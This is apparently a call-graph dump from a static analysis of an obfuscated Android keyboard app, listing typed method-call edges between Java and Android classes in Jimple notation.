STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r0, $i1, $r1, $i0, $i2) in <nvw: void j(int[],int[],int,int,int)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r2, $i7, $r10) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(6) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lmb: lme f()> ==> <liz: boolean hasNext()>
CLINIT edge: staticinvoke <lsl: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lsl: void <clinit>()>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.List: boolean isEmpty()>() in <ivv: int h()> ==> <java.util.ArrayList: boolean isEmpty()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.StringBuilder: java.lang.String toString()>() in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<lkq: int size()>() in <lkm: void <init>(lkq,int)> ==> <lqm: int size()>
SPECIAL edge: specialinvoke $r2.<lsk: void <init>(java.lang.Class)>(class "Llvt;") in <lsl: void <clinit>()> ==> <lsk: void <init>(java.lang.Class)>
SPECIAL edge: specialinvoke $r5.<java.util.WeakHashMap: void <init>()>() in <hcb: void <init>()> ==> <java.util.WeakHashMap: void <init>()>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(5) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljd: int d(int)>($i0) in <ljd: java.util.Map m()> ==> <ljd: int d(int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean f(ivv)>(r0) in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean f(ivv)>
STATIC edge: staticinvoke <java.lang.Thread: void yield()>() in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] f()> ==> <java.lang.Thread: void yield()>
SPECIAL edge: specialinvoke $r0.<java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>("initialized", $r1) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>
SPECIAL edge: specialinvoke r0.<liz: void <init>(ljd)>($r1) in <liw: void <init>(ljd)> ==> <liz: void <init>(ljd)>
VIRTUAL edge: $r7 = virtualinvoke r0.<ljd: java.lang.Object j()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object j()>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljd: int c()>() in <ljd: java.util.Map m()> ==> <ljd: int c()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorFeaturedMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke $r1.<jlu: void <init>(int)>(9) in <lvt: void <clinit>()> ==> <jlu: void <init>(int)>
STATIC edge: $i6 = staticinvoke <java.lang.Math: int min(int,int)>(1073741823, $i6) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.lang.Math: int min(int,int)>
STATIC edge: $l0 = staticinvoke <android.os.SystemClock: long elapsedRealtime()>() in <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <clinit>()> ==> <android.os.SystemClock: long elapsedRealtime()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lvt: boolean equals(java.lang.Object)>
SPECIAL edge: $i4 = specialinvoke r0.<ljd: int z(int,int,int,int)>($i4, $i5, $i3, $i0) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int z(int,int,int,int)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lid: int hashCode()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkx: lma g()>() in <lkx: lma q()> ==> <lqq: lma g()>
SPECIAL edge: specialinvoke $r2.<j$.sun.misc.b: void <init>(sun.misc.Unsafe)>($r4) in <j$.sun.misc.b: void <clinit>()> ==> <j$.sun.misc.b: void <init>(sun.misc.Unsafe)>
STATIC edge: $r1 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/apps/inputmethod/libs/framework/core/AppBase") in <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, null, null) in <j$.util.concurrent.g: void <init>(j$.util.concurrent.l[])> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<lts: lsz c(int)>($i1) in <lsd: boolean b(lsr)> ==> <ltr: lsz c(int)>
STATIC edge: $z0 = staticinvoke <lri: boolean V(java.util.List,java.lang.Object)>(r0, $r1) in <lkq: boolean equals(java.lang.Object)> ==> <lri: boolean V(java.util.List,java.lang.Object)>
STATIC edge: $r3 = staticinvoke <lma: lma r(java.lang.Object)>($r5) in <lly: lma g()> ==> <lma: lma r(java.lang.Object)>
SPECIAL edge: $z0 = specialinvoke r0.<ivw: boolean P()>() in <ivw: boolean equals(java.lang.Object)> ==> <ivw: boolean P()>
STATIC edge: staticinvoke <izw: void as(int,java.lang.String)>($i0, "initialCapacity") in <lkg: void <init>(int)> ==> <izw: void as(int,java.lang.String)>
SPECIAL edge: specialinvoke $r20.<mag: void <init>(java.lang.String,int,int)>("NATIVE_CARD", 20, 20) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
STATIC edge: $r1 = staticinvoke <lum: lto d(java.lang.String)>($r2) in <lth: lth i(java.lang.String)> ==> <lum: lto d(java.lang.String)>
VIRTUAL edge: $r18 = virtualinvoke r0.<lsn: lsc c()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsf: lsc c()>
STATIC edge: $r1 = staticinvoke <iwt: java.lang.String d(java.lang.String)>($r1) in <ivv: void g(java.lang.String)> ==> <iwt: java.lang.String d(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Enum: void <init>(java.lang.String,int)>($r1, $i0) in <ltc: void <init>(java.lang.String,int,int)> ==> <java.lang.Enum: void <init>(java.lang.String,int)>
VIRTUAL edge: virtualinvoke $r6.<lkt: void a(java.lang.Object,java.lang.Object)>($r3, $r11) in <lmb: lme f()> ==> <lkt: void a(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<ljf: void q(int)>($i4) in <ljf: int o(int,int,int,int)> ==> <ljf: void q(int)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(short[],short[])>($r6, $r7) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(short[],short[])>
SPECIAL edge: specialinvoke $r4.<java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>("segmentMask", $r2) in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(11) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $r3 = virtualinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: java.lang.String getType(android.net.Uri)>(null) in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: java.lang.String getType(android.net.Uri)>
VIRTUAL edge: $r15 = virtualinvoke $r13.<lvq: java.lang.Object c(int)>($i7) in <lvr: void <init>(lvr,lvr)> ==> <lvq: java.lang.Object c(int)>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <llg: boolean hasNext()>
SPECIAL edge: specialinvoke r0.<qj: void <init>()>() in <qc: void <init>()> ==> <qj: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke $r2.<ljd: java.util.Iterator l()>() in <liy: java.util.Iterator iterator()> ==> <ljd: java.util.Iterator l()>
SPECIAL edge: specialinvoke r0.<ljd: void A(int)>($i4) in <ljd: int z(int,int,int,int)> ==> <ljd: void A(int)>
SPECIAL edge: specialinvoke $r1.<lqm: void <init>(lqn)>(r0) in <lqn: lkq f()> ==> <lqm: void <init>(lqn)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(18) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r3.<java.lang.StringBuilder: void <init>()>() in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $r0 = virtualinvoke $r0.<java.lang.String: java.lang.String replace(char,char)>(47, 46) in <lsh: lsh j(java.lang.String)> ==> <java.lang.String: java.lang.String replace(char,char)>
SPECIAL edge: specialinvoke $r0.<lte: void <init>()>() in <ltf: void <clinit>()> ==> <lte: void <init>()>
STATIC edge: $r3 = staticinvoke <java.lang.Class: java.lang.Class forName(java.lang.String)>($r2) in <lwf: void <clinit>()> ==> <java.lang.Class: java.lang.Class forName(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <ivw: boolean equals(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r7.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_THUMBNAIL", 7, 7) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
SPECIAL edge: specialinvoke $r11.<java.lang.IllegalStateException: void <init>(java.lang.String)>($r4) in <luk: lum a(java.lang.String[])> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r1, "metadata value") in <lsn: void q(lsz,java.lang.Object)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: int hashCode()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Object: java.lang.Object clone()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lsc: void <init>(lto)>($r1) in <lsh: void <init>(lto)> ==> <lsc: void <init>(lto)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r0) in <iye: void D(boolean,java.lang.String,int,int)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<lkx: java.lang.Object get(java.lang.Object)>($r1) in <lme: lma d(java.lang.Object)> ==> <lqq: java.lang.Object get(java.lang.Object)>
STATIC edge: staticinvoke <iej: void g(java.lang.String,iec)>("InputMethodEntryManager_UserUnlocked", $r2) in <hnt: void <clinit>()> ==> <iej: void g(java.lang.String,iec)>
SPECIAL edge: specialinvoke $r8.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <iej: void g(java.lang.String,iec)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: int f(java.lang.Object)> ==> <ljd: int[] w()>
SPECIAL edge: specialinvoke $r0.<lqc: void <init>()>() in <lqc: void <clinit>()> ==> <lqc: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke r0.<lmo: int a(java.lang.Object,java.lang.Object)>($r8, $r3) in <lqs: boolean containsAll(java.util.Collection)> ==> <lmo: int a(java.lang.Object,java.lang.Object)>
STATIC edge: $i2 = staticinvoke <izw: int ag(int,int,int)>($i2, 0, $i1) in <ljf: void j(int,java.lang.Object,int,int)> ==> <izw: int ag(int,int,int)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lmb: lme f()> ==> <liz: java.lang.Object next()>
VIRTUAL edge: $l1 = virtualinvoke $r3.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/ConcurrentHashMap;", "baseCount") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <coo: void <init>(int)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r30.<hfd: void <init>(axu,java.lang.Class,ldp)>($r20, class "Ljava/nio/ByteBuffer;", $r19) in <hbw: java.lang.Object a(java.lang.Object)> ==> <hfd: void <init>(axu,java.lang.Class,ldp)>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r3 = staticinvoke <lkq: lkq A(java.util.Comparator,java.lang.Iterable)>($r5, $r2) in <lmb: lme f()> ==> <lkq: lkq A(java.util.Comparator,java.lang.Iterable)>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/apps/inputmethod/latin/LatinApp") in <com.google.android.apps.inputmethod.latin.LatinApp: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: int hashCode()>
STATIC edge: $r0 = staticinvoke <lsz: lsz c(java.lang.String,java.lang.Class)>("stack_size", class "Lltc;") in <lsl: void <clinit>()> ==> <lsz: lsz c(java.lang.String,java.lang.Class)>
STATIC edge: staticinvoke <lsc: void f(java.lang.String,ltn)>($r3, r0) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsc: void f(java.lang.String,ltn)>
SPECIAL edge: specialinvoke r0.<ivv: void <init>()>() in <ivv: void <init>(byte[])> ==> <ivv: void <init>()>
SPECIAL edge: specialinvoke $r17.<mag: void <init>(java.lang.String,int,int)>("EXPRESSIVE_STICKER_AUTOCOMPLETE", 17, 17) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<lts: int b()>() in <lsd: boolean b(lsr)> ==> <ltr: int b()>
STATIC edge: $i0 = staticinvoke <lkg: int a(int,int)>($i0, $i1) in <lkt: void e(int)> ==> <lkg: int a(int,int)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(7) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljd: int size()>() in <ljd: boolean isEmpty()> ==> <ljd: int size()>
VIRTUAL edge: $i0 = virtualinvoke r0.<qj: int b(java.lang.Object)>($r2) in <qj: java.lang.Object get(java.lang.Object)> ==> <qj: int b(java.lang.Object)>
SPECIAL edge: $r4 = specialinvoke r0.<ljf: java.lang.Object[] s()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: java.lang.Object[] s()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r3 = virtualinvoke $r1.<lsz: java.lang.Object d(java.lang.Object)>($r3) in <lsm: java.lang.Object d(lsz)> ==> <lsz: java.lang.Object d(java.lang.Object)>
SPECIAL edge: $z0 = specialinvoke r0.<lmo: boolean containsAll(java.util.Collection)>($r10) in <lqs: boolean containsAll(java.util.Collection)> ==> <java.util.AbstractCollection: boolean containsAll(java.util.Collection)>
STATIC edge: staticinvoke <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)>
SPECIAL edge: specialinvoke r0.<lkg: void g(int)>($i0) in <lkg: void c(java.lang.Object)> ==> <lkg: void g(int)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(18) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke $r6.<j$.util.concurrent.c: void <init>(long)>($l0) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.c: void <init>(long)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean z(java.lang.String)> ==> <java.lang.String: int length()>
VIRTUAL edge: $i0 = virtualinvoke $r2.<ljd: int d(int)>($i0) in <liz: java.lang.Object next()> ==> <ljd: int d(int)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <iej: void g(java.lang.String,iec)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(3) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
INTERFACE edge: $r7 = interfaceinvoke $r3.<java.util.Map: java.util.Set entrySet()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.util.Set entrySet()>
STATIC edge: $r0 = staticinvoke <j$.util.concurrent.r: j$.util.concurrent.s g(j$.util.concurrent.s,j$.util.concurrent.s)>($r0, $r3) in <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)> ==> <j$.util.concurrent.r: j$.util.concurrent.s g(j$.util.concurrent.s,j$.util.concurrent.s)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lig: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>($r1, null) in <j$.util.concurrent.ConcurrentHashMap: void q(int)> ==> <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqs: lsa l()>
STATIC edge: $z0 = staticinvoke <lvr: boolean e(int,int)>($i1, $i0) in <lvr: void <init>(lvr,lvr)> ==> <lvr: boolean e(int,int)>
INTERFACE edge: $i0 = interfaceinvoke $r2.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <lrg: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r1, 0, $r2, $i1, $i0) in <lqr: int b(java.lang.Object[],int)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
STATIC edge: $i2 = staticinvoke <izw: int ac(int)>($i0) in <lly: void j(java.lang.Object)> ==> <izw: int ac(int)>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r2, $i0) in <lly: lma g()> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqs: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<ltc: void <init>(java.lang.String,int,int)>("MEDIUM", 1, 20) in <ltc: void <clinit>()> ==> <ltc: void <init>(java.lang.String,int,int)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("CuratedImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: virtualinvoke $r7.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Incomplete privateUse subtag, error index: ") in <nzh: boolean f(ivv)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $l3 = virtualinvoke $r17.<java.util.concurrent.atomic.AtomicLong: long getAndIncrement()>() in <lsd: boolean b(lsr)> ==> <java.util.concurrent.atomic.AtomicLong: long getAndIncrement()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(58) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: int indexOf(java.lang.String,int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<her: void <init>(miy)>($r0) in <her: her k(miy)> ==> <her: void <init>(miy)>
STATIC edge: $r5 = staticinvoke <ivw: java.lang.String[] Q(java.util.List)>($r4) in <ivw: void <init>(ivv,java.lang.String)> ==> <ivw: java.lang.String[] Q(java.util.List)>
STATIC edge: $i1 = staticinvoke <izw: int ac(int)>($i1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <izw: int ac(int)>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: void r(int,java.lang.Object,java.lang.Object,int,int)> ==> <ljd: int[] w()>
SPECIAL edge: specialinvoke $r4.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("identifier must not be empty") in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $z2 = virtualinvoke $r2.<j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>(r0, $l3, $l4, $l5) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>
SPECIAL edge: $r5 = specialinvoke r0.<ljf: java.lang.Object p()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: java.lang.Object p()>
SPECIAL edge: $i5 = specialinvoke r0.<ljf: int o(int,int,int,int)>($i4, $i5, $i3, $i0) in <ljf: boolean add(java.lang.Object)> ==> <ljf: int o(int,int,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l0, $i1, $i2) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
STATIC edge: $r0 = staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>() in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.lang.Runtime: java.lang.Runtime getRuntime()>
CLINIT edge: staticinvoke <lwa: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lwa: void <clinit>()>
STATIC edge: $i1 = staticinvoke <izw: int ac(int)>($i1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <izw: int ac(int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<lth: void <init>(lto)>($r1) in <lth: lth i(java.lang.String)> ==> <lth: void <init>(lto)>
SPECIAL edge: specialinvoke $r6.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, $r1, $r2) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
INTERFACE edge: $r11 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getKey()>() in <hbv: void j()> ==> <lki: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(7) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
CLINIT edge: staticinvoke <com.google.android.apps.inputmethod.latin.ImeLatinApp: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <com.google.android.apps.inputmethod.latin.ImeLatinApp: void <clinit>()>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <lma: lma i(int,java.lang.Object[])> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<lsn: void q(lsz,java.lang.Object)>($r13, $r11) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsn: void q(lsz,java.lang.Object)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r1) in <ivv: ivw b(java.lang.String)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
STATIC edge: $i0 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: int k(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: int k(int)>
SPECIAL edge: specialinvoke $r0.<mag: void <init>(java.lang.String,int,int)>("UNKNOWN_SEARCH_FEATURE", 0, 0) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: int hashCode()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(12) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
VIRTUAL edge: $r3 = virtualinvoke $r30.<java.lang.StringBuilder: java.lang.String toString()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]: ") in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <iye: void Q(int,int)>($i0, $i1) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <iye: void Q(int,int)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqo: lsa l()>
CLINIT edge: staticinvoke <gsr: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <gsr: void <clinit>()>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/experiment/FlagFactory") in <hbu: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <ojg: boolean f(java.lang.Object,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Error: void <init>()>() in <java.lang.AssertionError: void <init>(java.lang.Object)> ==> <java.lang.Error: void <init>()>
